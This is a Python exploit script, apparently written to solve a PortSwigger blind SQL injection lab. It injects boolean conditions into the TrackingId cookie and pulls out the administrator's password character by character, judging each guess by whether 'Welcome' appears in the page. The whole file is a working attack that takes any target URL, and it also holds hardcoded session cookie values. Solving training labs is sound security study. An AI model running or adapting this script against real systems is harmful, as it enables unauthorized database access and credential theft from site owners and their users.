#!/bin/python3

"""
Lab Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

To run this script, We assume:
	You have already found the length of password.
	Change password length range according to your finding.
	Change cookies value.
"""

import requests, urllib3, urllib, sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def sqli_password(url):
	passwd = ''
	for i in range(1, 21):    # Length of password (Change this)
		for j in range(32, 126):   # Alpha-numeric + Special Chars ASCII Range (32 - 126)
			
			payload = f"' and (select ascii(substring(password, {i}, 1)) from users where username='administrator')='{j}'--"
			encoded_payload = urllib.parse.quote(payload)
			
			# Tracking ID cookie is vulnerable parameter (Change this)
			cookie = {'TrackingId':'Xnyy7YE69Fqghnwo' + encoded_payload,
				  'session':'fDYt3CEr3RlT4Rr4SA2c721Gv3PrEDLC'}
			
			r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
	
			if 'Welcome' not in r.text:
				sys.stdout.write('\r' + passwd + chr(j))
				sys.stdout.flush()
			else:
				passwd += chr(j)
				sys.stdout.write('\r' + passwd)
				sys.stdout.flush()
				break
			
def main():
	if len(sys.argv) != 2:
		print(f'(+) Usage: {(sys.argv[0]).strip()} <url>')
		print(f'(+) Example: {(sys.argv[0]).strip()} www.example.com')
		sys.exit(-1)
	
	url = (sys.argv[1]).strip()
	print('(+) Retrieving administrator password...')
	sqli_password(url)
	print('(+) Done!!')

if __name__=='__main__':
	main()
